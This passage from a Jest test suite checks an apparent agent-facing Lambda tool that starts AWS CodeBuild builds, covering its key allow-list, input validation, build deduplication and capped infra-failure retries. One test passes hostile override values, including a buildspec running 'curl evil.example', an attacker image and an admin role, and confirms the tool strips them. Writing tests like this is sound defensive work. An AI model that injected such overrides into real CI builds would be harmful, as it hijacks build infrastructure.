    const action = out.stages[0].actions[0];
    expect(action.token).toBe("<present>");
    expect(JSON.stringify(out)).not.toContain("super-secret-token");
  });

  it("approvalSkipped is false when the skipped Approval belongs to ANOTHER execution", async () => {
    // A previous run's skipped gate says nothing about this one.
    h.state.getPipelineStateImpl = async () => ({
      stageStates: [
        {
          stageName: "Approval",
          latestExecution: { status: "Skipped", pipelineExecutionId: "OLD" },
          actionStates: [
            { actionName: "Approve_deploy", latestExecution: { status: "Skipped" } },
          ],
        },
        {
          stageName: "Deploy",
          latestExecution: { status: "InProgress", pipelineExecutionId: "NEW" },
          actionStates: [],
        },
      ],
    });

    const out = await invoke("get_state", { execution_id: "NEW" });

    expect(out.approvalSkipped).toBe(false);
  });

  it("approvalSkipped is false on a pipeline with no approval stage at all", async () => {
    h.state.getPipelineStateImpl = async () => allGreenStages("NEW");

    const out = await invoke("get_state", { execution_id: "NEW" });

    expect(out.approvalSkipped).toBe(false);
    expect(out.succeeded).toBe(true);
  });
});

// ─── 4. start_ci_build (TEAM-4122 FR-4) ──────────────────────────────────────

describe("start_ci_build request shape (the allow-list)", () => {
  const SHA = "0949f9d8814aa3e2b1c4d5f6a7b8c9d0e1f2a3b4"; // 40-hex

  function startBuildCall() {
    return h.state.cbCalls.find((c) => c.type === "StartBuild");
  }

  it("sends EXACTLY {projectName, sourceVersion, idempotencyToken} — no fourth key", async () => {
    const out = await invoke("start_ci_build", { commit_sha: SHA, source_version: "pr/12" });

    // Deep-equal, not toMatchObject: an extra key IS the defect.
    expect(startBuildCall().input).toEqual({
      projectName: "agentcore-hub-ci",
      sourceVersion: "pr/12",
      idempotencyToken: `ci-${SHA}`,
    });
    expect(out.ok).toBe(true);
    expect(out.started).toBe(true);
    expect(out.project).toBe("agentcore-hub-ci");
    expect(out.buildId).toBe("agentcore-hub-ci:11111111-2222-3333-4444-555555555555");
  });

  it("ignores args.project — the project is env, never a caller argument", async () => {
    await invoke("start_ci_build", {
      commit_sha: SHA,
      project: "agentcore-hub-deploy",
      projectName: "agentcore-hub-deploy",
    });

    expect(startBuildCall().input.projectName).toBe("agentcore-hub-ci");
  });

  it("drops every CodeBuild *Override key an agent could pass", async () => {
    await invoke("start_ci_build", {
      commit_sha: SHA,
      buildspecOverride: "version: 0.2\nphases:\n  build:\n    commands:\n      - curl evil.example",
      environmentVariablesOverride: [{ name: "AWS_PROFILE", value: "prod" }],
      imageOverride: "public.ecr.aws/attacker/img:latest",
      privilegedModeOverride: true,
      serviceRoleOverride: "arn:aws:iam::111122223333:role/admin",
      sourceTypeOverride: "NO_SOURCE",
      sourceLocationOverride: "https://example.invalid/repo",
      idempotencyToken: "attacker-chosen",
    });

    const input = startBuildCall().input;
    expect(Object.keys(input).sort()).toEqual([
      "idempotencyToken",
      "projectName",
      "sourceVersion",
    ]);
    // Not even the token is caller-controlled — it is derived from the sha, which
    // is what makes a retried call idempotent.
    expect(input.idempotencyToken).toBe(`ci-${SHA}`);
  });

  it("clamps the idempotency token to 64 chars", async () => {
    await invoke("start_ci_build", { commit_sha: SHA });
    expect(startBuildCall().input.idempotencyToken.length).toBeLessThanOrEqual(64);
  });

  it("defaults sourceVersion to the commit sha", async () => {
    await invoke("start_ci_build", { commit_sha: SHA });
    expect(startBuildCall().input.sourceVersion).toBe(SHA);
  });

  it("lowercases an upper-case sha (one commit is one dedupe key)", async () => {
    await invoke("start_ci_build", { commit_sha: SHA.toUpperCase() });
    expect(startBuildCall().input.idempotencyToken).toBe(`ci-${SHA}`);
    expect(startBuildCall().input.sourceVersion).toBe(SHA);
  });
});

describe("start_ci_build input validation", () => {
  const SHA = "0949f9d";

  it("missing commit_sha → missing_commit_sha, and NO SDK call at all", async () => {
    const out = await invoke("start_ci_build", { source_version: "pr/12" });

    expect(out).toMatchObject({ ok: false, reason: "missing_commit_sha" });
    expect(h.state.cbCalls).toEqual([]);
  });

  it("a non-sha commit_sha → invalid_commit_sha, no SDK call", async () => {
    for (const bad of ["main", "0949f9", "zzzzzzz", "0949f9d8814aa3e2b1c4d5f6a7b8c9d0e1f2a3b4c5", "12345 67"]) {
      h.state.cbCalls = [];
      const out = await invoke("start_ci_build", { commit_sha: bad });
      expect(out.reason, bad).toBe("invalid_commit_sha");
      expect(h.state.cbCalls, bad).toEqual([]);
    }
  });

  it("rejects the source_version shapes that can resolve to something else", async () => {
    for (const bad of [
      "refs/pull/1/head", // a ref, not a branch — resolves via the remote's namespace
      "refs/heads/main",
      "a..b",             // a range
      "*",                // a wildcard
      "-startsWithDash",
      `${"b".repeat(201)}`,
    ]) {
      h.state.cbCalls = [];
      const out = await invoke("start_ci_build", { commit_sha: SHA, source_version: bad });
      expect(out, bad).toMatchObject({ ok: false, reason: "invalid_source_version" });
      expect(h.state.cbCalls, bad).toEqual([]);
    }
  });

  it("accepts pr/<n>, a 40-hex sha, and a plain branch name", async () => {
    for (const good of [
      "pr/1",
      "pr/1234567",
      "0949f9d8814aa3e2b1c4d5f6a7b8c9d0e1f2a3b4",
      "feature/TEAM-4122-backend-dev",
      "main",
      // Not a PR number, so it is read as a BRANCH named "pr/…" — a legal branch
      // name that simply may not exist. CodeBuild's own InvalidInputException is
      // the right place for "no such ref", not a shape rule that would also
      // reject someone's real `pr/hotfix` branch.
      "pr/12345678",
      "pr/abc",
    ]) {
      h.state.cbCalls = [];
      const out = await invoke("start_ci_build", { commit_sha: SHA, source_version: good });
      expect(out, good).toMatchObject({ ok: true, started: true });
      expect(h.state.cbCalls.find((c) => c.type === "StartBuild").input.sourceVersion).toBe(good);
    }
  });

  it("an invalid CI_PROJECT disables the tool — refused, with NO SDK call", async () => {
    // The whole point of F2/F3: if config points CI at a deploy project, the tool
    // must refuse rather than start it.
    for (const bad of ["agentcore-hub-deploy", "agentcore-hub-build", "agentcore-hub-runtime-image-deploy", "agentcore-hub-*", "a"]) {
      h.state.cbCalls = [];
      await withEnv({ CI_PROJECT: bad }, async ({ handler: h2 }) => {
        const out = await invokeOn(h2, "start_ci_build", { commit_sha: SHA });
        expect(out, bad).toMatchObject({ ok: false, reason: "ci_project_invalid" });
        expect(out.detail, bad).toBeTruthy();
      });
      expect(h.state.cbCalls, bad).toEqual([]);
    }
  });

  it("the read-only tools keep working when CI_PROJECT is invalid (no cold-start crash)", async () => {
    await withEnv({ CI_PROJECT: "agentcore-hub-deploy" }, async ({ handler: h2 }) => {
      h.state.getPipelineStateImpl = async () => allGreenStages("OLD");
      const out = await invokeOn(h2, "get_state", {});
      expect(out.configured).toBe(true);
    });
  });
});

describe("start_ci_build dedupe (one build per commit)", () => {
  const SHA = "0949f9d8814aa3e2b1c4d5f6a7b8c9d0e1f2a3b4";

  /** A project whose recent builds are exactly `rows` (newest first). */
  function recentBuilds(rows) {
    h.state.listBuildsImpl = async () => ({ ids: rows.map((r) => r.id) });
    h.state.batchGetBuildsImpl = async (input) => ({
      // Returned in a DIFFERENT order than requested on purpose: BatchGetBuilds
      // makes no ordering promise, so "newest" must come from the id list.
      builds: [...rows].reverse().filter((r) => input.ids.includes(r.id)),
    });
  }

  it("an IN_PROGRESS build for the same commit is reused — no second StartBuild", async () => {
    recentBuilds([
      { id: "b-2", buildStatus: "IN_PROGRESS", resolvedSourceVersion: SHA },
      { id: "b-1", buildStatus: "FAILED", resolvedSourceVersion: "deadbeefdeadbeefdeadbeefdeadbeefdeadbeef" },
    ]);

    const out = await invoke("start_ci_build", { commit_sha: SHA });

    expect(out).toMatchObject({
      ok: true,
      reused: true,
      buildId: "b-2",
      buildStatus: "IN_PROGRESS",
      resolvedSourceVersion: SHA,
      project: "agentcore-hub-ci",
    });
    expect(out.started).toBeUndefined();
    expect(h.state.cbCalls.find((c) => c.type === "StartBuild")).toBeUndefined();
  });

  it("a SUCCEEDED build for the same commit is reused too (CI already proved this head)", async () => {
    recentBuilds([{ id: "b-9", buildStatus: "SUCCEEDED", resolvedSourceVersion: SHA }]);

    const out = await invoke("start_ci_build", { commit_sha: SHA });

    expect(out).toMatchObject({ ok: true, reused: true, buildId: "b-9" });
    expect(h.state.cbCalls.find((c) => c.type === "StartBuild")).toBeUndefined();
  });

  it("a short commit_sha matches a full resolvedSourceVersion by prefix", async () => {
    recentBuilds([{ id: "b-3", buildStatus: "IN_PROGRESS", resolvedSourceVersion: SHA }]);

    const out = await invoke("start_ci_build", { commit_sha: "0949F9D" });

    expect(out).toMatchObject({ reused: true, buildId: "b-3" });
  });

  it("a FAILED build with no phase evidence is REFUSED, not re-run (TEAM-4448 D2 tightening)", async () => {
    // Pre-D2 this started a fresh build: "a FAILED build is not a reuse, and
    // re-running red CI is the use case". D2 narrows that to infra-phase deaths
    // only — with no `phases` there is no evidence the failure was infra, and the
    // carve-out fires on positive evidence only. NOT a regression: the retry suite
    // below pins the cases that DO get a second build.
    recentBuilds([{ id: "b-4", buildStatus: "FAILED", resolvedSourceVersion: SHA }]);

    const out = await invoke("start_ci_build", { commit_sha: SHA });

    expect(out).toMatchObject({
      ok: false,
      reason: "build_failed_not_retryable",
      prior_build_id: "b-4",
      prior_failed_phase: null,
      attempts: 1,
    });
    expect(h.state.cbCalls.find((c) => c.type === "StartBuild")).toBeUndefined();
  });

  it("a build for a DIFFERENT commit never dedupes this one", async () => {
    recentBuilds([
      { id: "b-5", buildStatus: "IN_PROGRESS", resolvedSourceVersion: "1111111111111111111111111111111111111111" },
      { id: "b-6", buildStatus: "SUCCEEDED", resolvedSourceVersion: null },
      // A non-hex resolvedSourceVersion (a branch) must not prefix-match a sha.
      { id: "b-7", buildStatus: "SUCCEEDED", resolvedSourceVersion: "main" },
    ]);

    const out = await invoke("start_ci_build", { commit_sha: SHA });

    expect(out).toMatchObject({ ok: true, started: true });
  });

  it("scans a bounded window of recent builds, newest first", async () => {
    // TEAM-4448 D2 widened the window from 30 to BatchGetBuilds' max of 100: the
    // scan now has to find every ATTEMPT for the sha, not just a live one, and a
    // busy PR-check project can bury the first attempt below 30. 60 ids fit inside
    // the window, so all 60 are fetched; the 100 clamp is pinned in the retry suite.
    recentBuilds(
      Array.from({ length: 60 }, (_, i) => ({
        id: `b-${i}`,
        buildStatus: "SUCCEEDED",
        resolvedSourceVersion: `2222222222222222222222222222222222222${String(i).padStart(3, "0")}`,
      }))
    );

    await invoke("start_ci_build", { commit_sha: SHA });

    const batch = h.state.cbCalls.find((c) => c.type === "BatchGetBuilds");
    expect(batch.input.ids.length).toBe(60);
    expect(batch.input.ids[0]).toBe("b-0");
  });
});

// ─── 4b. start_ci_build retry ledger (TEAM-4448 D2) ──────────────────────────

describe("start_ci_build retry ledger (TEAM-4448 D2)", () => {
  const SHA = "0949f9d8814aa3e2b1c4d5f6a7b8c9d0e1f2a3b4";

  /** CodeBuild's phases[] shape, from `[phaseType, phaseStatus]` pairs. */
  function phases(pairs) {
    return pairs.map(([phaseType, phaseStatus]) => ({
      phaseType,
      phaseStatus,
      durationInSeconds: 1,
    }));
  }

  /** A build that got as far as `deadPhase` and died there. Everything before it
   * SUCCEEDED, which is what makes "the FIRST bad phase is the cause" meaningful.
   *
   * TEAM-4462 F2: whether the build carries a resolvedSourceVersion is DERIVED from
   * the phase it died in, not hard-coded. CodeBuild sets resolvedSourceVersion only
   * once it has RESOLVED the ref, which happens in DOWNLOAD_SOURCE — so a build that
   * died in PROVISIONING, or in DOWNLOAD_SOURCE itself, carries none at all, only the
   * sourceVersion it was STARTED with. The pre-4462 fixture set resolvedSourceVersion
   * unconditionally and therefore asserted the ledger's own wrong assumption, which is
   * how the blind spot for exactly those two retryable phases went unnoticed. */
  function diedAt(id, deadPhase, buildStatus = "FAILED", extra = {}) {
    const order = [
      "SUBMITTED",
      "QUEUED",
      "PROVISIONING",
      "DOWNLOAD_SOURCE",
      "INSTALL",
      "PRE_BUILD",
      "BUILD",
      "POST_BUILD",
      "UPLOAD_ARTIFACTS",
      "FINALIZING",
    ];
    const cut = order.indexOf(deadPhase);
    const pairs = order
      .slice(0, cut + 1)
      .map((p) => [p, p === deadPhase ? buildStatus : "SUCCEEDED"]);
    const resolvedBeforeDeath = cut > order.indexOf("DOWNLOAD_SOURCE");
    return {
      id,
      buildStatus,
      // Resolved deaths keep NO sourceVersion, so "no prior sourceVersion at all →
      // the caller's value" below still exercises that fallback.
      ...(resolvedBeforeDeath ? { resolvedSourceVersion: SHA } : { sourceVersion: SHA }),
      phases: phases(pairs),
      ...extra,
    };
  }

  /** The project's recent builds, newest first (same fixture shape the dedupe
   * suite uses: BatchGetBuilds answers in a DIFFERENT order on purpose). */
  function ledger(rows) {
    h.state.listBuildsImpl = async () => ({ ids: rows.map((r) => r.id) });
    h.state.batchGetBuildsImpl = async (input) => ({
      builds: [...rows].reverse().filter((r) => input.ids.includes(r.id)),
    });
  }

  function startBuilds() {
    return h.state.cbCalls.filter((c) => c.type === "StartBuild");
  }

  // ── (a) the unchanged first-start path ───────────────────────────────────────

  it("no prior build for the sha → one plain start, token ci-<sha>", async () => {
    ledger([]);

    const out = await invoke("start_ci_build", { commit_sha: SHA });

    expect(startBuilds().length).toBe(1);
    expect(startBuilds()[0].input.idempotencyToken).toBe(`ci-${SHA}`);
    expect(out).toMatchObject({ ok: true, started: true });
    // A first start must not look like a retry to the caller.
    expect(out.retry).toBeUndefined();
    expect(out.retry_reason).toBeUndefined();
  });

  // ── (b,c,d) the carve-out: ONE retry after an infra-phase death ──────────────

  it("newest FAILED in INSTALL → exactly one retry, token ci-<sha>-r1, 3-key input", async () => {
    ledger([diedAt("b-install", "INSTALL")]);

    const out = await invoke("start_ci_build", { commit_sha: SHA });

    expect(startBuilds().length).toBe(1);
    // Deep-equal, not toMatchObject: a fourth key is the defect, retry or not.
    expect(startBuilds()[0].input).toEqual({
      projectName: "agentcore-hub-ci",
      sourceVersion: SHA,
      idempotencyToken: `ci-${SHA}-r1`,
    });
    expect(out).toMatchObject({
      ok: true,
      started: true,
      retry: true,
      retry_reason: "infra_install_failure",
      prior_build_id: "b-install",
      prior_failed_phase: "INSTALL",
      attempts: 1,
    });
  });

  it("newest FAILED in PRE_BUILD → granted, prior_failed_phase PRE_BUILD", async () => {
    ledger([diedAt("b-pre", "PRE_BUILD")]);

    const out = await invoke("start_ci_build", { commit_sha: SHA });

    expect(startBuilds().length).toBe(1);
    expect(out).toMatchObject({ ok: true, retry: true, prior_failed_phase: "PRE_BUILD" });
  });

  it("newest FAULT in PROVISIONING → granted (a FAULT is the platform, not the diff)", async () => {
    ledger([diedAt("b-prov", "PROVISIONING", "FAULT")]);

    const out = await invoke("start_ci_build", { commit_sha: SHA });

    expect(startBuilds().length).toBe(1);
    expect(out).toMatchObject({ ok: true, retry: true, prior_failed_phase: "PROVISIONING" });
  });

  it("TIMED_OUT in DOWNLOAD_SOURCE → granted", async () => {
    ledger([diedAt("b-dl", "DOWNLOAD_SOURCE", "TIMED_OUT")]);

    const out = await invoke("start_ci_build", { commit_sha: SHA });

    expect(startBuilds().length).toBe(1);
    expect(out).toMatchObject({ ok: true, retry: true, prior_failed_phase: "DOWNLOAD_SOURCE" });
  });

  // ── (e) the cap — the whole point of the feature ─────────────────────────────

  it("two INSTALL failures for one sha → ZERO StartBuild, install_flake_retry_failed", async () => {
    ledger([diedAt("b-install-2", "INSTALL"), diedAt("b-install-1", "INSTALL")]);

    const out = await invoke("start_ci_build", { commit_sha: SHA });

    expect(startBuilds()).toEqual([]);
    expect(out).toMatchObject({
      ok: false,
      reason: "install_flake_retry_failed",
      attempts: 2,
      prior_build_id: "b-install-2", // the NEWEST, so the agent reads the latest log
      prior_failed_phase: "INSTALL",
      project: "agentcore-hub-ci",
    });
    expect(out.detail).toContain("INSTALL");
    expect(out.detail).toContain("prior_build_id");
  });

  it("the cap cannot be dodged with a different source_version", async () => {
    ledger([diedAt("b-2", "INSTALL"), diedAt("b-1", "INSTALL")]);

    // The dedupe key is the SHA, and source_version does not enter it — otherwise
    // "call again with pr/<n> instead of the branch" would buy a third build.
    for (const source_version of [undefined, "main", "pr/7", SHA]) {
      h.state.cbCalls = [];
      const out = await invoke("start_ci_build", { commit_sha: SHA, source_version });
      expect(out.reason, String(source_version)).toBe("install_flake_retry_failed");
      expect(startBuilds(), String(source_version)).toEqual([]);
    }
  });

  // ── (f,g) code-phase failures are never re-run ───────────────────────────────

  it("newest FAILED in BUILD → ZERO StartBuild, build_failed_not_retryable", async () => {
    ledger([diedAt("b-build", "BUILD")]);

    const out = await invoke("start_ci_build", { commit_sha: SHA });

    expect(startBuilds()).toEqual([]);
    expect(out).toMatchObject({
      ok: false,
      reason: "build_failed_not_retryable",
      prior_build_id: "b-build",
      prior_failed_phase: "BUILD",
      attempts: 1,
    });
  });

  it("newest POST_BUILD failure wins over an older INSTALL flake", async () => {
    // The dangerous ordering bug: an older infra flake must not re-open the retry
    // door after a later attempt failed in the caller's own code.
    ledger([diedAt("b-post", "POST_BUILD"), diedAt("b-install", "INSTALL")]);

    const out = await invoke("start_ci_build", { commit_sha: SHA });

    expect(startBuilds()).toEqual([]);
    expect(out).toMatchObject({
      ok: false,
      reason: "build_failed_not_retryable",
      prior_build_id: "b-post",
      prior_failed_phase: "POST_BUILD",
      attempts: 2,
    });
  });

  // ── (h) a stop is a decision ─────────────────────────────────────────────────

  it("newest STOPPED → prior_build_stopped, zero StartBuild", async () => {
    ledger([diedAt("b-stopped", "BUILD", "STOPPED")]);

    const out = await invoke("start_ci_build", { commit_sha: SHA });

    expect(startBuilds()).toEqual([]);
    expect(out).toMatchObject({
      ok: false,
      reason: "prior_build_stopped",
      prior_build_id: "b-stopped",
      attempts: 1,
    });
  });

  it("a STOPPED build that died in INSTALL is still not retried", async () => {
    // STOPPED is absent from RETRYABLE_STATUSES, so the infra phase is irrelevant.
    ledger([diedAt("b-stopped-install", "INSTALL", "STOPPED")]);

    const out = await invoke("start_ci_build", { commit_sha: SHA });

    expect(startBuilds()).toEqual([]);
    expect(out.reason).toBe("prior_build_stopped");
  });

  // ── (i,j) a live build always wins over the ledger ───────────────────────────

  it("an IN_PROGRESS build wins over an older INSTALL failure (reuse, not retry)", async () => {
    ledger([
      { id: "b-live", buildStatus: "IN_PROGRESS", resolvedSourceVersion: SHA },
      diedAt("b-install", "INSTALL"),
    ]);

    const out = await invoke("start_ci_build", { commit_sha: SHA });

    expect(startBuilds()).toEqual([]);
    expect(out).toMatchObject({ ok: true, reused: true, buildId: "b-live" });
    expect(out.retry).toBeUndefined();
  });

  it("a SUCCEEDED build for the sha is still a plain reuse", async () => {
    ledger([
      { id: "b-green", buildStatus: "SUCCEEDED", resolvedSourceVersion: SHA },
      diedAt("b-install", "INSTALL"),
    ]);

    const out = await invoke("start_ci_build", { commit_sha: SHA });

    expect(startBuilds()).toEqual([]);
    expect(out).toMatchObject({ ok: true, reused: true, buildId: "b-green" });
  });

  // ── (k) classifyPriorBuild, directly ─────────────────────────────────────────

  it("classifyPriorBuild: the FIRST bad phase is the cause", () => {
    const out = classifyPriorBuild({
      buildStatus: "FAILED",
      phases: phases([
        ["SUBMITTED", "SUCCEEDED"],
        ["INSTALL", "FAILED"],
        ["BUILD", "FAILED"], // a consequence, not the cause
      ]),
    });
    expect(out).toEqual({ status: "FAILED", failedPhase: "INSTALL", isInfraFailure: true });
  });

  it("classifyPriorBuild: no phases → no failedPhase and NO retry", () => {
    // The carve-out fires on positive evidence only: no phases means we cannot
    // prove the failure was infra, so it is not treated as one.
    expect(classifyPriorBuild({ buildStatus: "FAILED", phases: [] })).toEqual({
      status: "FAILED",
      failedPhase: null,
      isInfraFailure: false,
    });
    expect(classifyPriorBuild({ buildStatus: "FAILED" })).toEqual({
      status: "FAILED",
      failedPhase: null,
      isInfraFailure: false,
    });
    expect(classifyPriorBuild(undefined)).toEqual({
      status: null,
      failedPhase: null,
      isInfraFailure: false,
    });
  });

  it("classifyPriorBuild: an infra phase does not override a non-retryable status", () => {
    for (const status of ["STOPPED", "SUCCEEDED", "IN_PROGRESS"]) {
      const out = classifyPriorBuild({
        buildStatus: status,
        phases: phases([["INSTALL", "FAILED"]]),
      });
      expect(out.failedPhase, status).toBe("INSTALL");
      expect(out.isInfraFailure, status).toBe(false);
    }
  });

  it("classifyPriorBuild: all-green phases → failedPhase null", () => {
    const out = classifyPriorBuild({
      buildStatus: "SUCCEEDED",
      phases: phases([["INSTALL", "SUCCEEDED"], ["BUILD", "SUCCEEDED"]]),
    });
    expect(out).toEqual({ status: "SUCCEEDED", failedPhase: null, isInfraFailure: false });
  });

  // ── (l) the scan window is clamped to BatchGetBuilds' max ────────────────────

  it("clamps the ledger scan to 100 ids (BatchGetBuilds' hard maximum)", async () => {
    ledger(
      Array.from({ length: 250 }, (_, i) => ({
        id: `b-${i}`,
        buildStatus: "SUCCEEDED",
        resolvedSourceVersion: `3333333333333333333333333333333333333${String(i).padStart(3, "0")}`,
      }))
    );

    await invoke("start_ci_build", { commit_sha: SHA });

    const batch = h.state.cbCalls.find((c) => c.type === "BatchGetBuilds");
    expect(batch.input.ids.length).toBe(100);
    expect(batch.input.ids[0]).toBe("b-0"); // newest first
  });

  // ── (m) one token per attempt ────────────────────────────────────────────────

  it("the retry token differs from the first attempt's, and both fit in 64 chars", async () => {
    ledger([]);
    await invoke("start_ci_build", { commit_sha: SHA });
    const first = startBuilds()[0].input.idempotencyToken;

    h.state.cbCalls = [];
    ledger([diedAt("b-install", "INSTALL")]);
    await invoke("start_ci_build", { commit_sha: SHA });
    const second = startBuilds()[0].input.idempotencyToken;

    expect(first).toBe(`ci-${SHA}`);
    expect(second).toBe(`ci-${SHA}-r1`);
    expect(second).not.toBe(first);
    expect(second.length).toBe(46);
    for (const token of [first, second]) expect(token.length).toBeLessThanOrEqual(64);
  });

  // ── (n) a denial on the retry is still the same denial ───────────────────────

  it("AccessDenied on the RETRY StartBuild → start_build_not_granted, same text", async () => {
    ledger([diedAt("b-install", "INSTALL")]);
    h.state.startBuildImpl = async () => {
      const err = new Error("not authorized to perform: codebuild:StartBuild");
      err.name = "AccessDeniedException";
      throw err;
    };

    const out = await invoke("start_ci_build", { commit_sha: SHA });

    expect(out).toMatchObject({
      ok: false,
      reason: "start_build_not_granted",
      project: "agentcore-hub-ci",
      prior_build_id: "b-install",
    });
    // Byte-identical remediation to the non-retry denial — the grant being absent
    // has nothing to do with why we were retrying.
    expect(out.detail).toContain("PIPELINE_CI_START_BUILD=1");
    expect(out.detail).toContain("PIPELINE_REGIONS");
    expect(out.detail).toContain("hub-*-ci");
    expect(out.detail).not.toContain("not authorized to perform");
    // The text says nothing about the retry — a missing grant is an operator fix
    // either way, so the remediation must not fork on how we got here.
    expect(out.detail).toContain("fall back to waiting on the repo's own webhook build");
    expect(out.detail).not.toContain("INSTALL");
    expect(out.detail).not.toContain("prior_build_id");
  });

  // ── (o) SR-3.2: sourceVersion comes from SHARED state on a retry ─────────────

  it("the retry pins sourceVersion to the prior build's pr/<n>", async () => {
    ledger([diedAt("b-install", "INSTALL", "FAILED", { sourceVersion: "pr/42" })]);

    const out = await invoke("start_ci_build", { commit_sha: SHA });

    expect(startBuilds()[0].input.sourceVersion).toBe("pr/42");
    // The response must report what was SENT, not what was asked for.
    expect(out.sourceVersion).toBe("pr/42");
  });

  it("the retry's pin beats an explicit caller source_version (concurrent-safe)", async () => {
    // Two agents retrying one commit share the token `ci-<sha>-r1`; CodeBuild
    // refuses that token with different parameters, so both MUST derive
    // sourceVersion from the prior build rather than from their own args.
    ledger([diedAt("b-install", "INSTALL", "FAILED", { sourceVersion: "pr/42" })]);

    const out = await invoke("start_ci_build", { commit_sha: SHA, source_version: "main" });

    expect(startBuilds()[0].input.sourceVersion).toBe("pr/42");
    expect(out.sourceVersion).toBe("pr/42");
  });

  it("a prior sourceVersion this Lambda would refuse falls back to the caller's", async () => {
    // `refs/pull/9/head` is exactly what isAllowedSourceVersion rejects (a ref can
    // resolve to something other than the branch it names). An older build started
    // outside this tool must not smuggle one back in through the retry pin.
    ledger([
      diedAt("b-install", "INSTALL", "FAILED", { sourceVersion: "refs/pull/9/head" }),
    ]);

    const out = await invoke("start_ci_build", { commit_sha: SHA, source_version: "pr/12" });

    expect(startBuilds()[0].input.sourceVersion).toBe("pr/12");
    expect(out.sourceVersion).toBe("pr/12");
  });

  it("no prior sourceVersion at all → the caller's value (default: the sha)", async () => {
    ledger([diedAt("b-install", "INSTALL")]); // diedAt sets no sourceVersion

    const out = await invoke("start_ci_build", { commit_sha: SHA });

    expect(startBuilds()[0].input.sourceVersion).toBe(SHA);
    expect(out.sourceVersion).toBe(SHA);
  });

  // ── SR-3.2: the token race, as CodeBuild reports it ─────────────────────────

  it("an idempotency-token InvalidInput → retry_in_flight (wait, do not fix)", async () => {
    ledger([diedAt("b-install", "INSTALL")]);
    h.state.startBuildImpl = async () => {
      const err = new Error("Idempotency token 'ci-...-r1' was already used");
      err.name = "InvalidInputException";
      throw err;
    };

    const out = await invoke("start_ci_build", { commit_sha: SHA });

    expect(out).toMatchObject({
      ok: false,
      reason: "retry_in_flight",
      prior_build_id: "b-install",
      project: "agentcore-hub-ci",
    });
  });

  it("a non-idempotency InvalidInput still maps to invalid_source_version", async () => {
    ledger([]);
    h.state.startBuildImpl = async () => {
      const err = new Error("Unable to resolve version: pr/999");
      err.name = "InvalidInputException";
      throw err;
    };

    const out = await invoke("start_ci_build", { commit_sha: SHA, source_version: "pr/999" });

    expect(out).toMatchObject({
      ok: false,
      reason: "invalid_source_version",
      sourceVersion: "pr/999",
    });
  });

  // ── (p) multi-target: the retry goes to the project OWNER's region ───────────

  it("a retry StartBuild goes to the CI project's own region", async () => {
    ledger([diedAt("b-install", "INSTALL")]);

    const out = await withRegistry(MULTI_REGISTRY, (mod) =>
      invokeOn(mod.handler, "start_ci_build", {
        pipeline_name: "agentcore-hub-deploy",
        project: "hub-widget-ci",
        commit_sha: SHA,
      })
    );

    expect(out).toMatchObject({ ok: true, retry: true, region: "us-west-2" });
    const start = h.state.cbCalls.find((c) => c.type === "StartBuild");
    expect(start.input).toEqual({
      projectName: "hub-widget-ci",
      sourceVersion: SHA,
      idempotencyToken: `ci-${SHA}-r1`,
    });
    // The ledger scan AND the retry both went to the project's region, not the
    // pipeline_name-resolved target's (us-east-1).
    expect([...new Set(h.state.cbCalls.map((c) => c.region))]).toEqual(["us-west-2"]);
  });

  it("a refused retry on a registry target makes zero StartBuild calls", async () => {
    ledger([diedAt("b-2", "INSTALL"), diedAt("b-1", "INSTALL")]);

    const out = await withRegistry(MULTI_REGISTRY, (mod) =>
      invokeOn(mod.handler, "start_ci_build", { project: "hub-widget-ci", commit_sha: SHA })
    );

    expect(out).toMatchObject({ reason: "install_flake_retry_failed", region: "us-west-2" });
    expect(h.state.cbCalls.filter((c) => c.type === "StartBuild")).toEqual([]);
  });

  // ── (q) the contract is discoverable without tripping over a refusal ────────

  it("capabilities advertises the retry contract at top level (version 4)", async () => {
    const out = await invoke("capabilities");

    expect(out.version).toBe(4);
    expect(out.ciRetry.maxBuildsPerSha).toBe(2);
    expect(out.ciRetry.infraRetryPhases.sort()).toEqual([
      "DOWNLOAD_SOURCE",
      "INSTALL",
      "PRE_BUILD",
      "PROVISIONING",
    ]);
    expect(out.ciRetry.scanWindow).toBe(100);
    expect(out.ciRetry.retryReason).toBe("infra_install_failure");
    // Every refusal an agent can receive, so ci-agent.md's branches are complete.
    expect(out.ciRetry.refusalReasons).toEqual([
      "install_flake_retry_failed",
      "build_failed_not_retryable",
      "prior_build_stopped",
      "retry_in_flight",
      "start_build_not_granted",
    ]);
    // Deployment-wide, not per target: the cap is a property of this code.
    expect(h.state.cbCalls).toEqual([]);
  });

  // ── (r) TEAM-4462 F2: a build that died BEFORE resolve still counts ──────────
  //
  // The ledger used to key ONLY on resolvedSourceVersion, which CodeBuild populates
  // once it has resolved the ref. PROVISIONING and DOWNLOAD_SOURCE deaths carry none,
  // so the two phases INFRA_RETRY_PHASES deliberately covers were invisible: attempts
  // stayed 0, every call was a plain first start with token `ci-<sha>`, and
  // capabilities.ciRetry.maxBuildsPerSha: 2 could not hold for them. `unresolved()`
  // builds a death with NO resolvedSourceVersion key at all — the CodeBuild contract.

  /** A build that died pre-resolve: no resolvedSourceVersion, only the ref it was
   * STARTED with. `ref` defaults to the sha (what start_ci_build sends when the caller
   * omits source_version). */
  function unresolved(id, deadPhase, buildStatus = "FAILED", ref = SHA) {
    const build = diedAt(id, deadPhase, buildStatus, { sourceVersion: ref });
    delete build.resolvedSourceVersion;
    return build;
  }

  it("(a) a PROVISIONING death with NO resolvedSourceVersion is counted → retry granted", async () => {
    ledger([unresolved("b-prov", "PROVISIONING", "FAULT")]);

    const out = await invoke("start_ci_build", { commit_sha: SHA });

    expect(startBuilds().length).toBe(1);
    // Still the 3-key allow-list, and the retry token — not a plain first start.
    expect(startBuilds()[0].input).toEqual({
      projectName: "agentcore-hub-ci",
      sourceVersion: SHA,
      idempotencyToken: `ci-${SHA}-r1`,
    });
    expect(out).toMatchObject({
      ok: true,
      started: true,
      retry: true,
      retry_reason: "infra_install_failure",
      prior_build_id: "b-prov",
      prior_failed_phase: "PROVISIONING",
      attempts: 1,
    });
  });

  it("(b) two pre-resolve deaths → the cap HOLDS: install_flake_retry_failed, attempts 2", async () => {
    // The defect in one line: before F2 this was attempts=0 and started a THIRD build.
    ledger([
      unresolved("b-dl-2", "DOWNLOAD_SOURCE", "TIMED_OUT"),
      unresolved("b-prov-1", "PROVISIONING", "FAULT"),
    ]);

    const out = await invoke("start_ci_build", { commit_sha: SHA });

    expect(startBuilds()).toEqual([]);
    expect(out).toMatchObject({
      ok: false,
      reason: "install_flake_retry_failed",
      attempts: 2,
      prior_build_id: "b-dl-2", // the NEWEST, so the agent reads the latest log
      prior_failed_phase: "DOWNLOAD_SOURCE",
    });
  });

